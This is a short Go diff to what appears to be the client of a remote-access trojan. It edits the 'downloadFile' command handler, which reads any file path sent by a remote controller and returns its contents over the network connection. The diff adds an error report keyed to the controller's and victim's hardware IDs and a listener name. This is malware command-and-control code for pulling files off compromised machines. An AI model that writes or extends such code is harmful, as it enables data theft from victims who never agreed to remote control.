@@ -328,14 +328,20 @@ func Read(Data []byte, Connection net.Conn) {
 	case "downloadFile":
 		{
 			FilePath := unmsgpack.ForcePathObject("FilePath").GetAsString()
-			// 将所有的反斜杠替换为斜杠
 			normalizedPathStr := strings.ReplaceAll(FilePath, "\\", "/")
-			println(normalizedPathStr)
-			// 读取文件到字节数组
+
 			data, err := ioutil.ReadFile(normalizedPathStr)
 			if err != nil {
 
-				//Log("Error downloading:"+err.Error(), Connection, *unmsgpack)
+				msgpack := new(MessagePack.MsgPack)
+				msgpack.ForcePathObject("Pac_ket").SetAsString("fileError")
+				msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
+				msgpack.ForcePathObject("DWID").SetAsString(unmsgpack.ForcePathObject("DWID").GetAsString())
+				msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
+				msgpack.ForcePathObject("Message").SetAsString(err.Error())
+				msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
+				//Log(PcInfo.GetHWID()+":download successful", Connection, *unmsgpack)
+				TCPsocket.Send(Connection, msgpack.Encode2Bytes())
 
 			}
 			msgpack := new(MessagePack.MsgPack)
